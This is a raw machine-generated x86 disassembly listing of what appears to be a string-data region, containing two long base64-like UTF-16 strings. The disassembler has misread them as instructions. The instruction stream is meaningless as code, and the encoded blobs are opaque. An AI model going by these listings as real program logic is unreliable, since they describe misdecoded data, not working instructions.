  40ab49:	00 4b 00             	add    %cl,0x0(%ebx)
  40ab4c:	2f                   	das
  40ab4d:	00 47 00             	add    %al,0x0(%edi)
  40ab50:	71 00                	jno    0x40ab52
  40ab52:	47                   	inc    %edi
  40ab53:	00 2b                	add    %ch,(%ebx)
  40ab55:	00 78 00             	add    %bh,0x0(%eax)
  40ab58:	4a                   	dec    %edx
  40ab59:	00 41 00             	add    %al,0x0(%ecx)
  40ab5c:	43                   	inc    %ebx
  40ab5d:	00 51 00             	add    %dl,0x0(%ecx)
  40ab60:	67 00 31             	add    %dh,(%bx,%di)
  40ab63:	00 6d 00             	add    %ch,0x0(%ebp)
  40ab66:	75 00                	jne    0x40ab68
  40ab68:	66 00 75 00          	data16 add %dh,0x0(%ebp)
  40ab6c:	31 00                	xor    %eax,(%eax)
  40ab6e:	58                   	pop    %eax
  40ab6f:	00 47 00             	add    %al,0x0(%edi)
  40ab72:	2b 00                	sub    (%eax),%eax
  40ab74:	31 00                	xor    %eax,(%eax)
  40ab76:	6f                   	outsl  %ds:(%esi),(%dx)
  40ab77:	00 35 00 43 00 63    	add    %dh,0x63004300
  40ab7d:	00 53 00             	add    %dl,0x0(%ebx)
  40ab80:	7a 00                	jp     0x40ab82
  40ab82:	6d                   	insl   (%dx),%es:(%edi)
  40ab83:	00 73 00             	add    %dh,0x0(%ebx)
  40ab86:	62 00                	bound  %eax,(%eax)
  40ab88:	75 00                	jne    0x40ab8a
  40ab8a:	46                   	inc    %esi
  40ab8b:	00 72 00             	add    %dh,0x0(%edx)
  40ab8e:	4d                   	dec    %ebp
  40ab8f:	00 51 00             	add    %dl,0x0(%ecx)
  40ab92:	55                   	push   %ebp
  40ab93:	00 6c 00 57          	add    %ch,0x57(%eax,%eax,1)
  40ab97:	00 5a 00             	add    %bl,0x0(%edx)
  40ab9a:	58                   	pop    %eax
  40ab9b:	00 67 00             	add    %ah,0x0(%edi)
  40ab9e:	63 00                	arpl   %eax,(%eax)
  40aba0:	61                   	popa
  40aba1:	00 61 00             	add    %ah,0x0(%ecx)
  40aba4:	53                   	push   %ebx
  40aba5:	00 51 00             	add    %dl,0x0(%ecx)
  40aba8:	5a                   	pop    %edx
  40aba9:	00 6c 00 41          	add    %ch,0x41(%eax,%eax,1)
  40abad:	00 4f 00             	add    %cl,0x0(%edi)
  40abb0:	6b 00 42             	imul   $0x42,(%eax),%eax
  40abb3:	00 5a 00             	add    %bl,0x0(%edx)
  40abb6:	79 00                	jns    0x40abb8
  40abb8:	6e                   	outsb  %ds:(%esi),(%dx)
  40abb9:	00 79 00             	add    %bh,0x0(%ecx)
  40abbc:	63 00                	arpl   %eax,(%eax)
  40abbe:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40abc2:	47                   	inc    %edi
  40abc3:	00 32                	add    %dh,(%edx)
  40abc5:	00 76 00             	add    %dh,0x0(%esi)
  40abc8:	68 00 48 00 38       	push   $0x38004800
  40abcd:	00 54 00 76          	add    %dl,0x76(%eax,%eax,1)
  40abd1:	00 46 00             	add    %al,0x0(%esi)
  40abd4:	45                   	inc    %ebp
  40abd5:	00 33                	add    %dh,(%ebx)
  40abd7:	00 51 00             	add    %dl,0x0(%ecx)
  40abda:	62 00                	bound  %eax,(%eax)
  40abdc:	75 00                	jne    0x40abde
  40abde:	4b                   	dec    %ebx
  40abdf:	00 4a 00             	add    %cl,0x0(%edx)
  40abe2:	73 00                	jae    0x40abe4
  40abe4:	44                   	inc    %esp
  40abe5:	00 4f 00             	add    %cl,0x0(%edi)
  40abe8:	67 00 45 00          	add    %al,0x0(%di)
  40abec:	43                   	inc    %ebx
  40abed:	00 33                	add    %dh,(%ebx)
  40abef:	00 75 00             	add    %dh,0x0(%ebp)
  40abf2:	77 00                	ja     0x40abf4
  40abf4:	69 00 79 00 37 00    	imul   $0x370079,(%eax),%eax
  40abfa:	4c                   	dec    %esp
  40abfb:	00 38                	add    %bh,(%eax)
  40abfd:	00 61 00             	add    %ah,0x0(%ecx)
  40ac00:	38 00                	cmp    %al,(%eax)
  40ac02:	30 00                	xor    %al,(%eax)
  40ac04:	69 00 78 00 32 00    	imul   $0x320078,(%eax),%eax
  40ac0a:	45                   	inc    %ebp
  40ac0b:	00 33                	add    %dh,(%ebx)
  40ac0d:	00 61 00             	add    %ah,0x0(%ecx)
  40ac10:	7a 00                	jp     0x40ac12
  40ac12:	47                   	inc    %edi
  40ac13:	00 6d 00             	add    %ch,0x0(%ebp)
  40ac16:	50                   	push   %eax
  40ac17:	00 68 00             	add    %ch,0x0(%eax)
  40ac1a:	38 00                	cmp    %al,(%eax)
  40ac1c:	4d                   	dec    %ebp
  40ac1d:	00 50 00             	add    %dl,0x0(%eax)
  40ac20:	75 00                	jne    0x40ac22
  40ac22:	43                   	inc    %ebx
  40ac23:	00 53 00             	add    %dl,0x0(%ebx)
  40ac26:	66 00 4a 00          	data16 add %cl,0x0(%edx)
  40ac2a:	66 00 75 00          	data16 add %dh,0x0(%ebp)
  40ac2e:	49                   	dec    %ecx
  40ac2f:	00 65 00             	add    %ah,0x0(%ebp)
  40ac32:	36 00 58 00          	add    %bl,%ss:0x0(%eax)
  40ac36:	52                   	push   %edx
  40ac37:	00 4c 00 71          	add    %cl,0x71(%eax,%eax,1)
  40ac3b:	00 42 00             	add    %al,0x0(%edx)
  40ac3e:	4d                   	dec    %ebp
  40ac3f:	00 2b                	add    %ch,(%ebx)
  40ac41:	00 4d 00             	add    %cl,0x0(%ebp)
  40ac44:	49                   	dec    %ecx
  40ac45:	00 52 00             	add    %dl,0x0(%edx)
  40ac48:	4a                   	dec    %edx
  40ac49:	00 46 00             	add    %al,0x0(%esi)
  40ac4c:	78 00                	js     0x40ac4e
  40ac4e:	33 00                	xor    (%eax),%eax
  40ac50:	33 00                	xor    (%eax),%eax
  40ac52:	52                   	push   %edx
  40ac53:	00 45 00             	add    %al,0x0(%ebp)
  40ac56:	56                   	push   %esi
  40ac57:	00 2f                	add    %ch,(%edi)
  40ac59:	00 65 00             	add    %ah,0x0(%ebp)
  40ac5c:	68 00 68 00 56       	push   $0x56006800
  40ac61:	00 4b 00             	add    %cl,0x0(%ebx)
  40ac64:	58                   	pop    %eax
  40ac65:	00 67 00             	add    %ah,0x0(%edi)
  40ac68:	6a 00                	push   $0x0
  40ac6a:	33 00                	xor    (%eax),%eax
  40ac6c:	59                   	pop    %ecx
  40ac6d:	00 53 00             	add    %dl,0x0(%ebx)
  40ac70:	6c                   	insb   (%dx),%es:(%edi)
  40ac71:	00 41 00             	add    %al,0x0(%ecx)
  40ac74:	49                   	dec    %ecx
  40ac75:	00 6e 00             	add    %ch,0x0(%esi)
  40ac78:	73 00                	jae    0x40ac7a
  40ac7a:	2f                   	das
  40ac7b:	00 70 00             	add    %dh,0x0(%eax)
  40ac7e:	4e                   	dec    %esi
  40ac7f:	00 54 00 4c          	add    %dl,0x4c(%eax,%eax,1)
  40ac83:	00 2f                	add    %ch,(%edi)
  40ac85:	00 48 00             	add    %cl,0x0(%eax)
  40ac88:	39 00                	cmp    %eax,(%eax)
  40ac8a:	6b 00 77             	imul   $0x77,(%eax),%eax
  40ac8d:	00 41 00             	add    %al,0x0(%ecx)
  40ac90:	3d 00 00 87 b1       	cmp    $0xb1870000,%eax
  40ac95:	6c                   	insb   (%dx),%es:(%edi)
  40ac96:	00 36                	add    %dh,(%esi)
  40ac98:	00 52 00             	add    %dl,0x0(%edx)
  40ac9b:	4f                   	dec    %edi
  40ac9c:	00 54 00 39          	add    %dl,0x39(%eax,%eax,1)
  40aca0:	00 71 00             	add    %dh,0x0(%ecx)
  40aca3:	77 00                	ja     0x40aca5
  40aca5:	69 00 37 00 32 00    	imul   $0x320037,(%eax),%eax
  40acab:	54                   	push   %esp
  40acac:	00 42 00             	add    %al,0x0(%edx)
  40acaf:	48                   	dec    %eax
  40acb0:	00 65 00             	add    %ah,0x0(%ebp)
  40acb3:	58                   	pop    %eax
  40acb4:	00 73 00             	add    %dh,0x0(%ebx)
  40acb7:	6b 00 6f             	imul   $0x6f,(%eax),%eax
  40acba:	00 38                	add    %bh,(%eax)
  40acbc:	00 5a 00             	add    %bl,0x0(%edx)
  40acbf:	58                   	pop    %eax
  40acc0:	00 4d 00             	add    %cl,0x0(%ebp)
  40acc3:	35 00 59 00 57       	xor    $0x57005900,%eax
  40acc8:	00 7a 00             	add    %bh,0x0(%edx)
  40accb:	51                   	push   %ecx
  40accc:	00 77 00             	add    %dh,0x0(%edi)
  40accf:	30 00                	xor    %al,(%eax)
  40acd1:	4e                   	dec    %esi
  40acd2:	00 51 00             	add    %dl,0x0(%ecx)
  40acd5:	36 00 72 00          	add    %dh,%ss:0x0(%edx)
  40acd9:	31 00                	xor    %eax,(%eax)
  40acdb:	47                   	inc    %edi
  40acdc:	00 4e 00             	add    %cl,0x0(%esi)
  40acdf:	31 00                	xor    %eax,(%eax)
  40ace1:	58                   	pop    %eax
  40ace2:	00 79 00             	add    %bh,0x0(%ecx)
  40ace5:	4c                   	dec    %esp
  40ace6:	00 67 00             	add    %ah,0x0(%edi)
  40ace9:	6d                   	insl   (%dx),%es:(%edi)
  40acea:	00 74 00 56          	add    %dh,0x56(%eax,%eax,1)
  40acee:	00 6d 00             	add    %ch,0x0(%ebp)
  40acf1:	69 00 6e 00 71 00    	imul   $0x71006e,(%eax),%eax
  40acf7:	4d                   	dec    %ebp
  40acf8:	00 73 00             	add    %dh,0x0(%ebx)
  40acfb:	62 00                	bound  %eax,(%eax)
  40acfd:	5a                   	pop    %edx
  40acfe:	00 63 00             	add    %ah,0x0(%ebx)
  40ad01:	6e                   	outsb  %ds:(%esi),(%dx)
  40ad02:	00 63 00             	add    %ah,0x0(%ebx)
  40ad05:	79 00                	jns    0x40ad07
  40ad07:	77 00                	ja     0x40ad09
  40ad09:	69 00 30 00 32 00    	imul   $0x320030,(%eax),%eax
  40ad0f:	74 00                	je     0x40ad11
  40ad11:	58                   	pop    %eax
  40ad12:	00 62 00             	add    %ah,0x0(%edx)
  40ad15:	73 00                	jae    0x40ad17
  40ad17:	70 00                	jo     0x40ad19
  40ad19:	33 00                	xor    (%eax),%eax
  40ad1b:	35 00 74 00 2b       	xor    $0x2b007400,%eax
  40ad20:	00 6a 00             	add    %ch,0x0(%edx)
  40ad23:	2f                   	das
  40ad24:	00 2f                	add    %ch,(%edi)
  40ad26:	00 6e 00             	add    %ch,0x0(%esi)
  40ad29:	65 00 69 00          	add    %ch,%gs:0x0(%ecx)
  40ad2d:	6a 00                	push   $0x0
  40ad2f:	56                   	push   %esi
  40ad30:	00 38                	add    %bh,(%eax)
  40ad32:	00 51 00             	add    %dl,0x0(%ecx)
  40ad35:	33 00                	xor    (%eax),%eax
  40ad37:	6c                   	insb   (%dx),%es:(%edi)
  40ad38:	00 5a 00             	add    %bl,0x0(%edx)
  40ad3b:	75 00                	jne    0x40ad3d
  40ad3d:	30 00                	xor    %al,(%eax)
  40ad3f:	4e                   	dec    %esi
  40ad40:	00 4c 00 62          	add    %cl,0x62(%eax,%eax,1)
  40ad44:	00 39                	add    %bh,(%ecx)
  40ad46:	00 4a 00             	add    %cl,0x0(%edx)
  40ad49:	51                   	push   %ecx
  40ad4a:	00 51 00             	add    %dl,0x0(%ecx)
  40ad4d:	47                   	inc    %edi
  40ad4e:	00 2b                	add    %ch,(%ebx)
  40ad50:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40ad54:	00 5a 00             	add    %bl,0x0(%edx)
  40ad57:	66 00 37             	data16 add %dh,(%edi)
  40ad5a:	00 56 00             	add    %dl,0x0(%esi)
  40ad5d:	2b 00                	sub    (%eax),%eax
  40ad5f:	38 00                	cmp    %al,(%eax)
  40ad61:	7a 00                	jp     0x40ad63
  40ad63:	77 00                	ja     0x40ad65
  40ad65:	44                   	inc    %esp
  40ad66:	00 72 00             	add    %dh,0x0(%edx)
  40ad69:	4f                   	dec    %edi
  40ad6a:	00 35 00 34 00 47    	add    %dh,0x47003400
  40ad70:	00 39                	add    %bh,(%ecx)
  40ad72:	00 52 00             	add    %dl,0x0(%edx)
  40ad75:	6b 00 41             	imul   $0x41,(%eax),%eax
  40ad78:	00 6d 00             	add    %ch,0x0(%ebp)
  40ad7b:	57                   	push   %edi
  40ad7c:	00 69 00             	add    %ch,0x0(%ecx)
  40ad7f:	54                   	push   %esp
  40ad80:	00 75 00             	add    %dh,0x0(%ebp)
  40ad83:	6e                   	outsb  %ds:(%esi),(%dx)
  40ad84:	00 35 00 46 00 73    	add    %dh,0x73004600
  40ad8a:	00 73 00             	add    %dh,0x0(%ebx)
  40ad8d:	51                   	push   %ecx
  40ad8e:	00 42 00             	add    %al,0x0(%edx)
  40ad91:	46                   	inc    %esi
  40ad92:	00 53 00             	add    %dl,0x0(%ebx)
  40ad95:	36 00 58 00          	add    %bl,%ss:0x0(%eax)
  40ad99:	68 00 50 00 4d       	push   $0x4d005000
  40ad9e:	00 6d 00             	add    %ch,0x0(%ebp)
  40ada1:	57                   	push   %edi
  40ada2:	00 45 00             	add    %al,0x0(%ebp)
  40ada5:	7a 00                	jp     0x40ada7
  40ada7:	44                   	inc    %esp
  40ada8:	00 68 00             	add    %ch,0x0(%eax)
  40adab:	6e                   	outsb  %ds:(%esi),(%dx)
  40adac:	00 64 00 45          	add    %ah,0x45(%eax,%eax,1)
  40adb0:	00 51 00             	add    %dl,0x0(%ecx)
  40adb3:	4b                   	dec    %ebx
  40adb4:	00 62 00             	add    %ah,0x0(%edx)
  40adb7:	69 00 42 00 52 00    	imul   $0x520042,(%eax),%eax
  40adbd:	53                   	push   %ebx
  40adbe:	00 52 00             	add    %dl,0x0(%edx)
  40adc1:	78 00                	js     0x40adc3
  40adc3:	6b 00 49             	imul   $0x49,(%eax),%eax
  40adc6:	00 6a 00             	add    %ch,0x0(%edx)
  40adc9:	34 00                	xor    $0x0,%al
  40adcb:	59                   	pop    %ecx
  40adcc:	00 46 00             	add    %al,0x0(%esi)
  40adcf:	68 00 35 00 68       	push   $0x68003500
  40add4:	00 35 00 71 00 6d    	add    %dh,0x6d007100
  40adda:	00 48 00             	add    %cl,0x0(%eax)
  40addd:	64 00 68 00          	add    %ch,%fs:0x0(%eax)
  40ade1:	70 00                	jo     0x40ade3
  40ade3:	45                   	inc    %ebp
  40ade4:	00 62 00             	add    %ah,0x0(%edx)
  40ade7:	32 00                	xor    (%eax),%al
  40ade9:	43                   	inc    %ebx
  40adea:	00 33                	add    %dh,(%ebx)
  40adec:	00 74 00 2f          	add    %dh,0x2f(%eax,%eax,1)
  40adf0:	00 50 00             	add    %dl,0x0(%eax)
  40adf3:	5a                   	pop    %edx
  40adf4:	00 36                	add    %dh,(%esi)
  40adf6:	00 47 00             	add    %al,0x0(%edi)
  40adf9:	71 00                	jno    0x40adfb
  40adfb:	31 00                	xor    %eax,(%eax)
  40adfd:	58                   	pop    %eax
  40adfe:	00 45 00             	add    %al,0x0(%ebp)
  40ae01:	54                   	push   %esp
  40ae02:	00 76 00             	add    %dh,0x0(%esi)
  40ae05:	46                   	inc    %esi
  40ae06:	00 4c 00 39          	add    %cl,0x39(%eax,%eax,1)
  40ae0a:	00 2f                	add    %ch,(%edi)
  40ae0c:	00 4d 00             	add    %cl,0x0(%ebp)
  40ae0f:	6f                   	outsl  %ds:(%esi),(%dx)
  40ae10:	00 51 00             	add    %dl,0x0(%ecx)
  40ae13:	37                   	aaa
  40ae14:	00 2f                	add    %ch,(%edi)
  40ae16:	00 50 00             	add    %dl,0x0(%eax)
  40ae19:	68 00 4e 00 31       	push   $0x31004e00
  40ae1e:	00 4e 00             	add    %cl,0x0(%esi)
  40ae21:	53                   	push   %ebx
  40ae22:	00 42 00             	add    %al,0x0(%edx)
  40ae25:	59                   	pop    %ecx
  40ae26:	00 4d 00             	add    %cl,0x0(%ebp)
  40ae29:	7a 00                	jp     0x40ae2b
  40ae2b:	66 00 58 00          	data16 add %bl,0x0(%eax)
  40ae2f:	53                   	push   %ebx
  40ae30:	00 53 00             	add    %dl,0x0(%ebx)
  40ae33:	4e                   	dec    %esi
  40ae34:	00 38                	add    %bh,(%eax)
  40ae36:	00 32                	add    %dh,(%edx)
  40ae38:	00 67 00             	add    %ah,0x0(%edi)
  40ae3b:	43                   	inc    %ebx
  40ae3c:	00 5a 00             	add    %bl,0x0(%edx)
  40ae3f:	37                   	aaa
  40ae40:	00 56 00             	add    %dl,0x0(%esi)
  40ae43:	61                   	popa
  40ae44:	00 44 00 42          	add    %al,0x42(%eax,%eax,1)
  40ae48:	00 55 00             	add    %dl,0x0(%ebp)
  40ae4b:	6b 00 2f             	imul   $0x2f,(%eax),%eax
  40ae4e:	00 75 00             	add    %dh,0x0(%ebp)
  40ae51:	35 00 5a 00 77       	xor    $0x77005a00,%eax
  40ae56:	00 68 00             	add    %ch,0x0(%eax)
  40ae59:	4f                   	dec    %edi
  40ae5a:	00 67 00             	add    %ah,0x0(%edi)
  40ae5d:	65 00 4c 00 49       	add    %cl,%gs:0x49(%eax,%eax,1)
  40ae62:	00 42 00             	add    %al,0x0(%edx)
  40ae65:	6c                   	insb   (%dx),%es:(%edi)
  40ae66:	00 2b                	add    %ch,(%ebx)
  40ae68:	00 53 00             	add    %dl,0x0(%ebx)
  40ae6b:	61                   	popa
  40ae6c:	00 7a 00             	add    %bh,0x0(%edx)
  40ae6f:	4a                   	dec    %edx
  40ae70:	00 71 00             	add    %dh,0x0(%ecx)
  40ae73:	31 00                	xor    %eax,(%eax)
  40ae75:	31 00                	xor    %eax,(%eax)
  40ae77:	68 00 37 00 6a       	push   $0x6a003700
  40ae7c:	00 6b 00             	add    %ch,0x0(%ebx)
  40ae7f:	64 00 62 00          	add    %ah,%fs:0x0(%edx)
  40ae83:	34 00                	xor    $0x0,%al
  40ae85:	6c                   	insb   (%dx),%es:(%edi)
  40ae86:	00 74 00 6e          	add    %dh,0x6e(%eax,%eax,1)
  40ae8a:	00 73 00             	add    %dh,0x0(%ebx)
  40ae8d:	47                   	inc    %edi
  40ae8e:	00 67 00             	add    %ah,0x0(%edi)
  40ae91:	76 00                	jbe    0x40ae93
  40ae93:	63 00                	arpl   %eax,(%eax)
  40ae95:	42                   	inc    %edx
  40ae96:	00 36                	add    %dh,(%esi)
  40ae98:	00 36                	add    %dh,(%esi)
  40ae9a:	00 78 00             	add    %bh,0x0(%eax)
  40ae9d:	65 00 6a 00          	add    %ch,%gs:0x0(%edx)
  40aea1:	73 00                	jae    0x40aea3
  40aea3:	32 00                	xor    (%eax),%al
  40aea5:	6e                   	outsb  %ds:(%esi),(%dx)
  40aea6:	00 47 00             	add    %al,0x0(%edi)
  40aea9:	47                   	inc    %edi
  40aeaa:	00 32                	add    %dh,(%edx)
  40aeac:	00 46 00             	add    %al,0x0(%esi)
  40aeaf:	6a 00                	push   $0x0
  40aeb1:	66 00 6d 00          	data16 add %ch,0x0(%ebp)
  40aeb5:	75 00                	jne    0x40aeb7
  40aeb7:	58                   	pop    %eax
  40aeb8:	00 6f 00             	add    %ch,0x0(%edi)
  40aebb:	32 00                	xor    (%eax),%al
  40aebd:	34 00                	xor    $0x0,%al
  40aebf:	32 00                	xor    (%eax),%al
  40aec1:	6f                   	outsl  %ds:(%esi),(%dx)
  40aec2:	00 42 00             	add    %al,0x0(%edx)
  40aec5:	62 00                	bound  %eax,(%eax)
  40aec7:	49                   	dec    %ecx
  40aec8:	00 77 00             	add    %dh,0x0(%edi)
  40aecb:	36 00 2f             	add    %ch,%ss:(%edi)
  40aece:	00 44 00 61          	add    %al,0x61(%eax,%eax,1)
  40aed2:	00 4e 00             	add    %cl,0x0(%esi)
  40aed5:	6f                   	outsl  %ds:(%esi),(%dx)
  40aed6:	00 78 00             	add    %bh,0x0(%eax)
  40aed9:	68 00 69 00 48       	push   $0x48006900
  40aede:	00 55 00             	add    %dl,0x0(%ebp)
  40aee1:	64 00 35 00 70 00 67 	add    %dh,%fs:0x67007000
  40aee8:	00 4e 00             	add    %cl,0x0(%esi)
  40aeeb:	34 00                	xor    $0x0,%al
  40aeed:	57                   	push   %edi
  40aeee:	00 4d 00             	add    %cl,0x0(%ebp)
  40aef1:	53                   	push   %ebx
  40aef2:	00 79 00             	add    %bh,0x0(%ecx)
  40aef5:	74 00                	je     0x40aef7
  40aef7:	4c                   	dec    %esp
  40aef8:	00 68 00             	add    %ch,0x0(%eax)
  40aefb:	4e                   	dec    %esi
  40aefc:	00 6c 00 55          	add    %ch,0x55(%eax,%eax,1)
  40af00:	00 64 00 75          	add    %ah,0x75(%eax,%eax,1)
  40af04:	00 76 00             	add    %dh,0x0(%esi)
  40af07:	70 00                	jo     0x40af09
  40af09:	68 00 59 00 35       	push   $0x35005900
  40af0e:	00 49 00             	add    %cl,0x0(%ecx)
  40af11:	64 00 4d 00          	add    %cl,%fs:0x0(%ebp)
  40af15:	41                   	inc    %ecx
  40af16:	00 35 00 55 00 4c    	add    %dh,0x4c005500
  40af1c:	00 36                	add    %dh,(%esi)
  40af1e:	00 70 00             	add    %dh,0x0(%eax)
  40af21:	32 00                	xor    (%eax),%al
  40af23:	59                   	pop    %ecx
  40af24:	00 34 00             	add    %dh,(%eax,%eax,1)
  40af27:	41                   	inc    %ecx
  40af28:	00 6a 00             	add    %ch,0x0(%edx)
  40af2b:	45                   	inc    %ebp
  40af2c:	00 38                	add    %bh,(%eax)
  40af2e:	00 34 00             	add    %dh,(%eax,%eax,1)
  40af31:	4c                   	dec    %esp
  40af32:	00 76 00             	add    %dh,0x0(%esi)
  40af35:	46                   	inc    %esi
  40af36:	00 67 00             	add    %ah,0x0(%edi)
  40af39:	4d                   	dec    %ebp
  40af3a:	00 59 00             	add    %bl,0x0(%ecx)
  40af3d:	41                   	inc    %ecx
  40af3e:	00 77 00             	add    %dh,0x0(%edi)
  40af41:	39 00                	cmp    %eax,(%eax)
  40af43:	7a 00                	jp     0x40af45
  40af45:	34 00                	xor    $0x0,%al
  40af47:	79 00                	jns    0x40af49
  40af49:	43                   	inc    %ebx
  40af4a:	00 6b 00             	add    %ch,0x0(%ebx)
  40af4d:	4c                   	dec    %esp
  40af4e:	00 76 00             	add    %dh,0x0(%esi)
  40af51:	77 00                	ja     0x40af53
  40af53:	79 00                	jns    0x40af55
  40af55:	6c                   	insb   (%dx),%es:(%edi)
  40af56:	00 55 00             	add    %dl,0x0(%ebp)
  40af59:	2b 00                	sub    (%eax),%eax
  40af5b:	49                   	dec    %ecx
  40af5c:	00 32                	add    %dh,(%edx)
  40af5e:	00 49 00             	add    %cl,0x0(%ecx)
  40af61:	77 00                	ja     0x40af63
  40af63:	45                   	inc    %ebp
  40af64:	00 64 00 4b          	add    %ah,0x4b(%eax,%eax,1)
  40af68:	00 4c 00 65          	add    %cl,0x65(%eax,%eax,1)
  40af6c:	00 2f                	add    %ch,(%edi)
  40af6e:	00 78 00             	add    %bh,0x0(%eax)
  40af71:	72 00                	jb     0x40af73
  40af73:	67 00 4b 00          	add    %cl,0x0(%bp,%di)
  40af77:	6c                   	insb   (%dx),%es:(%edi)
  40af78:	00 6c 00 78          	add    %ch,0x78(%eax,%eax,1)
  40af7c:	00 65 00             	add    %ah,0x0(%ebp)
  40af7f:	68 00 6d 00 58       	push   $0x58006d00
  40af84:	00 46 00             	add    %al,0x0(%esi)
  40af87:	47                   	inc    %edi
  40af88:	00 4c 00 51          	add    %cl,0x51(%eax,%eax,1)
  40af8c:	00 2f                	add    %ch,(%edi)
  40af8e:	00 34 00             	add    %dh,(%eax,%eax,1)
  40af91:	38 00                	cmp    %al,(%eax)
  40af93:	62 00                	bound  %eax,(%eax)
  40af95:	68 00 58 00 57       	push   $0x57005800
  40af9a:	00 32                	add    %dh,(%edx)
  40af9c:	00 57 00             	add    %dl,0x0(%edi)
  40af9f:	61                   	popa
  40afa0:	00 54 00 64          	add    %dl,0x64(%eax,%eax,1)
  40afa4:	00 38                	add    %bh,(%eax)
  40afa6:	00 6c 00 76          	add    %ch,0x76(%eax,%eax,1)
  40afaa:	00 4b 00             	add    %cl,0x0(%ebx)
  40afad:	41                   	inc    %ecx
  40afae:	00 64 00 37          	add    %ah,0x37(%eax,%eax,1)
  40afb2:	00 4f 00             	add    %cl,0x0(%edi)
  40afb5:	4c                   	dec    %esp
  40afb6:	00 6b 00             	add    %ch,0x0(%ebx)
  40afb9:	44                   	inc    %esp
  40afba:	00 2f                	add    %ch,(%edi)
  40afbc:	00 67 00             	add    %ah,0x0(%edi)
  40afbf:	45                   	inc    %ebp
  40afc0:	00 63 00             	add    %ah,0x0(%ebx)
  40afc3:	71 00                	jno    0x40afc5
  40afc5:	52                   	push   %edx
  40afc6:	00 41 00             	add    %al,0x0(%ecx)
  40afc9:	6d                   	insl   (%dx),%es:(%edi)
  40afca:	00 49 00             	add    %cl,0x0(%ecx)
  40afcd:	61                   	popa
  40afce:	00 4f 00             	add    %cl,0x0(%edi)
  40afd1:	31 00                	xor    %eax,(%eax)
  40afd3:	59                   	pop    %ecx
  40afd4:	00 53 00             	add    %dl,0x0(%ebx)
  40afd7:	6b 00 5a             	imul   $0x5a,(%eax),%eax
  40afda:	00 41 00             	add    %al,0x0(%ecx)
  40afdd:	34 00                	xor    $0x0,%al
  40afdf:	6f                   	outsl  %ds:(%esi),(%dx)
  40afe0:	00 68 00             	add    %ch,0x0(%eax)
  40afe3:	54                   	push   %esp
  40afe4:	00 51 00             	add    %dl,0x0(%ecx)
  40afe7:	37                   	aaa
  40afe8:	00 73 00             	add    %dh,0x0(%ebx)
  40afeb:	7a 00                	jp     0x40afed
  40afed:	36 00 72 00          	add    %dh,%ss:0x0(%edx)
  40aff1:	44                   	inc    %esp
  40aff2:	00 77 00             	add    %dh,0x0(%edi)
  40aff5:	5a                   	pop    %edx
  40aff6:	00 57 00             	add    %dl,0x0(%edi)
  40aff9:	4e                   	dec    %esi
  40affa:	00 72 00             	add    %dh,0x0(%edx)
  40affd:	4c                   	dec    %esp
  40affe:	00 45 00             	add    %al,0x0(%ebp)
  40b001:	2b 00                	sub    (%eax),%eax
  40b003:	6b 00 53             	imul   $0x53,(%eax),%eax
  40b006:	00 32                	add    %dh,(%edx)
  40b008:	00 38                	add    %bh,(%eax)
  40b00a:	00 59 00             	add    %bl,0x0(%ecx)
  40b00d:	6e                   	outsb  %ds:(%esi),(%dx)
  40b00e:	00 35 00 66 00 73    	add    %dh,0x73006600
  40b014:	00 62 00             	add    %ah,0x0(%edx)
  40b017:	59                   	pop    %ecx
  40b018:	00 66 00             	add    %ah,0x0(%esi)
  40b01b:	48                   	dec    %eax
  40b01c:	00 57 00             	add    %dl,0x0(%edi)
  40b01f:	46                   	inc    %esi
  40b020:	00 31                	add    %dh,(%ecx)
  40b022:	00 4b 00             	add    %cl,0x0(%ebx)
  40b025:	47                   	inc    %edi
  40b026:	00 6e 00             	add    %ch,0x0(%esi)
  40b029:	76 00                	jbe    0x40b02b
  40b02b:	4c                   	dec    %esp
  40b02c:	00 32                	add    %dh,(%edx)
  40b02e:	00 31                	add    %dh,(%ecx)
  40b030:	00 35 00 39 00 79    	add    %dh,0x79003900
  40b036:	00 35 00 6e 00 53    	add    %dh,0x53006e00
  40b03c:	00 69 00             	add    %ch,0x0(%ecx)
  40b03f:	4d                   	dec    %ebp
  40b040:	00 5a 00             	add    %bl,0x0(%edx)
  40b043:	6c                   	insb   (%dx),%es:(%edi)
  40b044:	00 74 00 2f          	add    %dh,0x2f(%eax,%eax,1)
  40b048:	00 30                	add    %dh,(%eax)
  40b04a:	00 46 00             	add    %al,0x0(%esi)
  40b04d:	58                   	pop    %eax
  40b04e:	00 49 00             	add    %cl,0x0(%ecx)
  40b051:	53                   	push   %ebx
  40b052:	00 48 00             	add    %cl,0x0(%eax)
  40b055:	48                   	dec    %eax
  40b056:	00 6b 00             	add    %ch,0x0(%ebx)
  40b059:	62 00                	bound  %eax,(%eax)
  40b05b:	34 00                	xor    $0x0,%al
  40b05d:	72 00                	jb     0x40b05f
  40b05f:	6e                   	outsb  %ds:(%esi),(%dx)
  40b060:	00 6b 00             	add    %ch,0x0(%ebx)
  40b063:	35 00 38 00 53       	xor    $0x53003800,%eax
  40b068:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b06b:	4b                   	dec    %ebx
  40b06c:	00 63 00             	add    %ah,0x0(%ebx)
  40b06f:	6d                   	insl   (%dx),%es:(%edi)
  40b070:	00 4c 00 54          	add    %cl,0x54(%eax,%eax,1)
  40b074:	00 65 00             	add    %ah,0x0(%ebp)
  40b077:	59                   	pop    %ecx
  40b078:	00 36                	add    %dh,(%esi)
  40b07a:	00 48 00             	add    %cl,0x0(%eax)
  40b07d:	4c                   	dec    %esp
  40b07e:	00 5a 00             	add    %bl,0x0(%edx)
  40b081:	43                   	inc    %ebx
  40b082:	00 31                	add    %dh,(%ecx)
  40b084:	00 58 00             	add    %bl,0x0(%eax)
  40b087:	73 00                	jae    0x40b089
  40b089:	32 00                	xor    (%eax),%al
  40b08b:	6c                   	insb   (%dx),%es:(%edi)
  40b08c:	00 41 00             	add    %al,0x0(%ecx)
  40b08f:	65 00 59 00          	add    %bl,%gs:0x0(%ecx)
  40b093:	44                   	inc    %esp
  40b094:	00 48 00             	add    %cl,0x0(%eax)
  40b097:	55                   	push   %ebp
  40b098:	00 75 00             	add    %dh,0x0(%ebp)
  40b09b:	35 00 4a 00 70       	xor    $0x70004a00,%eax
  40b0a0:	00 76 00             	add    %dh,0x0(%esi)
  40b0a3:	48                   	dec    %eax
  40b0a4:	00 77 00             	add    %dh,0x0(%edi)
  40b0a7:	53                   	push   %ebx
  40b0a8:	00 4d 00             	add    %cl,0x0(%ebp)
  40b0ab:	6f                   	outsl  %ds:(%esi),(%dx)
  40b0ac:	00 5a 00             	add    %bl,0x0(%edx)
